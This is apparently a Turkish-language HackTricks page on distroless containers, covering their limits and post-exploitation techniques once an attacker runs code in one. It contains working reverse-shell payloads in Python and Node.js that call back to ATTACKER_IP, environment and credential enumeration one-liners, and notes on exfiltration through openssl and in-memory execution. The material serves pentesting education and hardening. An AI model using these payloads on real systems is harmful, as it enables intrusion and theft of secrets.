# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

**Distroless** container image'ları, belirli bir uygulamayı çalıştırmak için gereken **minimum runtime bileşenlerini** içerirken paket yöneticileri, shell'ler ve genel amaçlı userland araçlarından oluşan geniş kümeler gibi alışılmış dağıtım araçlarını bilerek kaldırır. Pratikte distroless image'lar genellikle yalnızca uygulama binary'sini veya runtime'ını, paylaşılan kütüphanelerini, sertifika paketlerini ve çok küçük bir dosya sistemi düzenini içerir. <sup>[[1]](#references)</sup>

Amaç, distroless'in yeni bir kernel izolasyon primitive'i olduğu değildir. Distroless bir **image tasarım stratejisidir**. Container dosya sistemi **içinde** nelerin bulunduğunu değiştirir; kernel'in container'ı nasıl izole ettiğini değil. Bu ayrım önemlidir; çünkü distroless, saldırganın kod yürütme elde ettikten sonra kullanabileceklerini azaltarak ortamı esas olarak harden eder. Namespaces, seccomp, capabilities, AppArmor, SELinux veya başka bir runtime izolasyon mekanizmasının yerini almaz.

## Distroless Neden Var?

Distroless image'lar öncelikle şunları azaltmak için kullanılır:

- image boyutunu
- image'ın operasyonel karmaşıklığını
- güvenlik açığı içerebilecek paket ve binary sayısını
- varsayılan olarak saldırganın kullanabileceği post-exploitation araçlarının sayısını

Bu nedenle distroless image'lar production uygulama dağıtımlarında popülerdir. Shell, paket yöneticisi ve neredeyse hiç genel amaçlı araç içermeyen bir container'ı operasyonel olarak değerlendirmek genellikle daha kolay, ele geçirildikten sonra etkileşimli biçimde kötüye kullanmak ise daha zordur.

Bilinen distroless tarzı image ailelerine örnekler:

- Google's distroless image'ları <sup>[[1]](#references)</sup>
- Chainguard hardened/minimal image'ları <sup>[[2]](#references)</sup>

## Distroless Ne Anlama Gelmez?

Distroless bir container:

- otomatik olarak rootless değildir
- otomatik olarak non-privileged değildir
- otomatik olarak read-only değildir
- otomatik olarak seccomp, AppArmor veya SELinux tarafından korunmaz
- otomatik olarak container escape'e karşı güvenli değildir

Distroless bir image'ı `--privileged`, host namespace'lerini paylaşarak, tehlikeli bind mount'larla veya mount edilmiş bir runtime socket'iyle çalıştırmak hâlâ mümkündür. Böyle bir senaryoda image minimal olabilir, ancak container yine de son derece güvensiz olabilir. Distroless, **userland attack surface'ünü** değiştirir; **kernel trust boundary'yi** değil.

## Tipik Operasyonel Özellikler

Distroless bir container'ı ele geçirdiğinizde genellikle ilk fark ettiğiniz şey, yaygın varsayımların artık geçerli olmamasıdır. `sh`, `bash`, `ls`, `id`, `cat` bulunmayabilir; hatta bazen alışılmış tradecraft'inizin beklediği şekilde çalışan libc tabanlı bir ortam bile olmayabilir. Araçların yokluğu hata ayıklamayı, incident response'u ve post-exploitation'ı farklı hâle getirdiğinden, bu durum hem saldırı hem de savunma tarafını etkiler.

En yaygın örüntüler şunlardır:

- uygulama runtime'ı vardır, ancak başka pek az şey bulunur
- shell tabanlı payload'lar, shell olmadığı için başarısız olur
- yardımcı binary'ler bulunmadığı için yaygın enumeration one-liner'ları başarısız olur
- read-only rootfs veya yazılabilir tmpfs konumlarında `noexec` gibi dosya sistemi korumaları da çoğu zaman kullanılır

Distroless'i "weaponize etmekten" söz edilmesine genellikle bu bileşim yol açar.

## Distroless ve Post-Exploitation

Distroless ortamındaki temel saldırı zorluğu her zaman ilk RCE değildir. Çoğu zaman asıl zorluk, sonrasında ne yapılacağıdır. Ele geçirilen workload Python, Node.js, Java veya Go gibi bir dil runtime'ında kod yürütme sağlıyorsa, normal shell merkezli iş akışlarını kullanmadan da rastgele mantık yürütmeniz mümkün olabilir. Bu tür iş akışları diğer Linux hedeflerinde yaygındır.

Bu nedenle post-exploitation genellikle şu üç yönden birine kayar:

1. Ortamı enumerate etmek, socket açmak, dosya okumak veya ek payload'ları stage etmek için **mevcut dil runtime'ını doğrudan kullanmak**.
2. Dosya sistemi read-only ise veya yazılabilir konumlar `noexec` olarak mount edilmişse **kendi araçlarınızı belleğe getirmek**.
3. Uygulamada veya bağımlılıklarında beklenmedik biçimde işe yarar bir şey varsa **image'da zaten bulunan binary'leri kötüye kullanmak**.

## Kötüye Kullanım

### Halihazırda Mevcut Runtime'ı Enumerate Edin

Birçok distroless container'da shell yoktur, ancak uygulama runtime'ı hâlâ bulunur. Hedef bir Python servisi ise Python vardır. Hedef Node.js ise Node vardır. Bu sayede genellikle dosyaları enumerate etmek, ortam değişkenlerini okumak, reverse shell açmak ve `/bin/sh`'i hiç çalıştırmadan bellekte yürütme için payload stage etmek mümkün olur.

Python ile basit bir örnek:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Node.js ile basit bir örnek:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Etki:

- genellikle kimlik bilgileri veya hizmet uç noktaları içeren ortam değişkenlerinin kurtarılması
- `/bin/ls` olmadan dosya sisteminin listelenmesi
- yazılabilir yolların ve bağlanan secret'ların belirlenmesi

### `/bin/sh` Olmadan Etkileşimli Runtime

Image `sh` veya `bash` içermiyorsa klasik shell tabanlı reverse shell başarısız olur. Bu durumda, mevcut olmayan bir shell başlatmak yerine kurulu dil runtime'ında etkileşimli bir oturum açın.

Örneğin, bu Python payload'ı etkileşimli bir Python konsolunu bir socket üzerinden yönlendirir:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Eşdeğer Node.js yaklaşımı, bir socket üzerinden alınan JavaScript kodunu değerlendirebilir. Bu, işletim sistemi shell'i değil, bir JavaScript REPL'dir; dosya sistemi, süreç ve ağ işlemleri Node'un API'leri aracılığıyla gerçekleştirilmelidir:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Her iki örnek de dışarıya bağlantı ve kullanılabilir bir interpreter gerektirir; ayrıca yalnızca bu interpreter'ın sunduğu işlevleri sağlar.

Image beklenmedik şekilde `/bin/sh` içeriyorsa klasik interpreter destekli shell payload'ları yine işe yarar. Bunlar gerçekten shell-free olmadıkları için ayrı gösterilmiştir:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

Eski Python command-loop kalıbı, `/bin/sh` bulunduğu ancak etkileşimli bir PTY kullanmanın elverişsiz olduğu durumlarda da faydalıdır. Gerçek bağımlılığı açıkça belirtilerek burada korunmuştur: `subprocess.run(..., shell=True)` sistem shell'ini çağırır ve bu nedenle **no-shell tekniği değildir**.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Tam Örnek: Shell Olmadan Python Komut Döngüsü

Image'da Python var ancak hiç shell yoksa, yerel bir Python REPL yine de dosya sistemi, ortam ve ağ incelemesini destekleyebilir:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Bu döngü `/bin/sh` çalıştırmaz. Python ifadelerini ve deyimlerini doğrudan değerlendirir; bu nedenle işlemler shell komutları yerine Python API'lerini kullanmalıdır. Bu kısıtlamaya rağmen temel bir shell'in sağladığı imkânların çoğunu sunabilir: dosya sistemi ve ortam değişkenlerini listeleme, verilere erişme, ağ etkinliği ve kurulu runtime üzerinden ek payload'ları aşamalı olarak yükleme.

### Bellek İçi Araç Çalıştırma

Distroless image'lar genellikle şunlarla birlikte kullanılır:

- `readOnlyRootFilesystem: true`
- `/dev/shm` gibi yazılabilir ancak `noexec` olarak bağlanmış tmpfs
- paket yönetimi araçlarının bulunmaması

Bu birleşim, klasik "binary'yi diske indirip çalıştırma" iş akışlarını güvenilmez hâle getirir. Böyle durumlarda bellek içi çalıştırma teknikleri başlıca çözüm olur.

Bununla ilgili özel sayfa:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Buradaki en ilgili teknikler:

- Scripting runtime'lar üzerinden `memfd_create` + `execve` <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Python, Node.js veya PHP kullanan bir servis için giriş noktası; template injection, prototype pollution veya güvenli olmayan değerlendirme gibi bir uygulama hatası olabilir. Bu hata süreç içinde code execution sağlarsa, `/proc/self/mem` tekniği shell veya diskte executable dosya olmadan bir loader çalıştırabilir. Bu, container sürecinin kimliğiyle çalışmaya devam eder; container escape için ayrı bir runtime veya host sınırı zafiyeti gerekir. Gereksinimler için [read-only/noexec/distroless tekniklerine](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) bakın.

### Image'da Zaten Bulunan Binary'ler

Bazı distroless image'larda, ele geçirilme sonrasında işe yarayabilecek ve operasyonel açıdan gerekli binary'ler bulunur. Sıkça gözlemlenen bir örnek `openssl`'dür; çünkü uygulamalar bazen şifreleme veya TLS ile ilgili işler için buna ihtiyaç duyar.

Hızlı bir arama kalıbı:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

`openssl` mevcutsa şu amaçlarla kullanılabilir:

- giden TLS bağlantıları
- izin verilen bir egress kanalı üzerinden veri exfiltration
- encoded/encrypted blob'lar aracılığıyla payload verilerini hazırlama

Tam olarak nasıl kötüye kullanılabileceği gerçekten kurulu olanlara bağlıdır; ancak genel fikir, distroless'ın "hiç araç yok" anlamına gelmediği, "normal bir dağıtım imajına kıyasla çok daha az araç olduğu" anlamına geldiğidir.

## Kontroller

Bu kontrollerin amacı, imajın pratikte gerçekten distroless olup olmadığını ve post-exploitation için hangi runtime veya yardımcı binary'lerin hâlâ kullanılabilir olduğunu belirlemektir.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Burada ilginç olanlar:

- Shell yoksa ancak Python veya Node gibi bir runtime varsa, post-exploitation süreci runtime tarafından yönlendirilen execution'a pivot etmelidir.
- Root filesystem salt okunursa ve `/dev/shm` yazılabilir ancak `noexec` ise, memory execution teknikleri çok daha önemli hale gelir.
- `openssl`, `busybox` veya `java` gibi yardımcı binary'ler varsa, daha fazla erişim elde etmek için gereken başlangıç işlevselliğini sağlayabilirler.

## Runtime Varsayılanları

| Image / platform tarzı | Varsayılan durum | Tipik davranış | Sık görülen manuel zayıflatmalar |
| --- | --- | --- | --- |
| Google distroless tarzı image'lar | Tasarım gereği minimal userland | Shell yok, package manager yok; yalnızca uygulama/runtime bağımlılıkları var | Debugging katmanları veya sidecar shell'ler eklemek, busybox ya da araçları kopyalamak |
| Chainguard minimal image'ları | Tasarım gereği minimal userland | Azaltılmış package yüzeyi; genellikle tek bir runtime veya service'e odaklı | `:latest-dev` veya debug varyantlarını kullanmak, build sırasında araçları kopyalamak |
| Distroless image'lar kullanan Kubernetes workload'ları | Pod yapılandırmasına bağlı | Distroless yalnızca userland'i etkiler; Pod'un güvenlik duruşu yine Pod spec'e ve runtime varsayılanlarına bağlıdır | Ephemeral debug container'ları eklemek, host mount'ları kullanmak, privileged Pod ayarları |
| Distroless image'lar çalıştıran Docker / Podman | Çalıştırma flag'lerine bağlı | Minimal filesystem; ancak runtime güvenliği yine flag''lere ve daemon yapılandırmasına bağlıdır | `--privileged`, host namespace paylaşımı, runtime socket mount'ları, yazılabilir host bind'leri |

Önemli nokta, distroless'in bir **image özelliği** olmasıdır; runtime koruması değildir. Sağladığı değer, sistem ele geçirildikten sonra filesystem içinde nelerin kullanılabilir olduğunu azaltmasından gelir. Multi-stage build'ler, build araçlarını final image'ın dışında tutmanın yaygın bir yoludur. <sup>[[3]](#references)</sup>

## İlgili Sayfalar

Distroless ortamlarında yaygın olarak gereken filesystem ve memory-execution bypass'ları için:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Distroless workload'ları için de geçerli olan container runtime, socket ve mount kötüye kullanımı için:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless container image'ları](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images dokümantasyonu](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Multi-stage build'ler](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
